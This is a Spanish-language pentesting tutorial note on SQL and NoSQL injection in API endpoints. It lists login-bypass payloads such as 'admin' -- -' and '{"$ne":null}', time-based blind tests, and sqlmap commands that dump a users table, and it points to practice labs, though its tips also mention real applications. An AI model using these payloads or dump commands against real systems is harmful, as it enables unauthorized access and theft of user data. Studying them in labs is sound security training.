# SQL Injection en APIs

**SQL Injection (SQLi)** ocurre cuando los datos que envías se concatenan dentro de una consulta SQL sin sanear, permitiéndote **alterar la consulta**: leer datos de otras tablas, saltarte la autenticación o, en el peor caso, ejecutar comandos en el servidor. En APIs el punto de inyección suele estar en **parámetros JSON**, no en formularios clásicos.

> Esta nota se centra en el contexto de APIs. Para la teoría completa de SQLi (UNION, ciega, por tiempos, extracción manual), ver [`Vulnerabilidades/Web/SQL Injection.md`](../../Web/SQL%20Injection.md).

---

## Dónde inyectar en una API

El payload va dentro del JSON, en cabeceras o en la URL:

```http
POST /api/v1/login HTTP/1.1
Content-Type: application/json

{"username":"admin' -- -","password":"loquesea"}
```

```http
GET /api/v1/products?category=electronics' HTTP/1.1
```

Puntos típicos: filtros de búsqueda, ordenación (`?sort=`), paginación, login, y cualquier `id` que no sea claramente un entero validado.

---

## Detección rápida

Inyecta caracteres que rompan la sintaxis SQL y observa errores o cambios de comportamiento:

```text
'              → ¿error 500 / mensaje de SQL?
''             → ¿vuelve a funcionar?
' OR '1'='1
" OR "1"="1
`
;--
```

Para detección **ciega por tiempos** (no hay error visible pero la consulta se ejecuta):

```json
{"username":"admin' AND SLEEP(5)-- -","password":"x"}
```

Si la respuesta tarda ~5 segundos, hay inyección.

---

## Bypass de autenticación (el clásico)

```json
{"username":"admin' -- -","password":"x"}
{"username":"admin' OR 1=1 -- -","password":"x"}
{"username":"' OR 1=1 LIMIT 1 -- -","password":"x"}
```

La idea: cerrar la comilla del `username`, forzar una condición siempre verdadera y comentar el resto de la consulta (incluida la comprobación de contraseña).

---

## Explotación automática con sqlmap

Guarda la petición vulnerable desde Burp (`Save item`) y pásala a **sqlmap**:

```bash
# A partir de una petición guardada (respeta JSON, cabeceras y token)
sqlmap -r peticion.txt --batch

# Marcando el punto de inyección con * dentro del JSON
sqlmap -r peticion.txt -p username --batch --level 5 --risk 3

# Volcar la base de datos
sqlmap -r peticion.txt --dbs                 # listar bases de datos
sqlmap -r peticion.txt -D <db> --tables      # tablas
sqlmap -r peticion.txt -D <db> -T users --dump
```

> sqlmap entiende JSON: en el fichero `peticion.txt` puedes poner un `*` donde quieras forzar la prueba, p. ej. `{"username":"admin*","password":"x"}`.

---

## NoSQL Injection (MongoDB y similares)

Muchas APIs modernas usan bases NoSQL. La inyección cambia de forma: se abusa de operadores en el JSON.

```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":"admin","password":{"$gt":""}}
{"username":{"$regex":"^adm"},"password":{"$ne":"x"}}
```

`$ne` (not equal), `$gt` (greater than) y `$regex` permiten saltarse logins y extraer datos carácter a carácter.

---

## Impacto

Bypass de autenticación, volcado completo de la base de datos (usuarios, hashes, datos personales), y en según qué motor, lectura/escritura de ficheros y RCE. Es uno de los fallos más críticos y de los que más máquinas resuelve.

---

> **Consejo:** en el login de cualquier API, prueba siempre `admin' -- -` y la versión NoSQL `{"$ne":null}`. Son dos pruebas de 10 segundos que resuelven una cantidad enorme de máquinas y aplicaciones reales.

---

## Dónde practicar la SQLi en APIs

| Lab | Qué probar | Enlace |
| --- | ---------- | ------ |
| [VAmPI](./Laboratorios/VAmPI.md) | Inyección en el login (`admin' -- -`) | https://github.com/erev0s/VAmPI |
| [OWASP Juice Shop](./Laboratorios/OWASP%20Juice%20Shop.md) | SQLi en el login (`' OR 1=1 -- -`) | https://github.com/juice-shop/juice-shop |
| PortSwigger — SQL injection | Teoría y labs completos | https://portswigger.net/web-security/sql-injection |

> **Consejo:** en cualquier login de API prueba `admin' -- -` y la versión NoSQL `{"$ne":null}`. Dos pruebas de 10 segundos que abren muchísimas aplicaciones. La teoría completa está en la [nota de SQLi web](../../Web/SQL%20Injection.md).
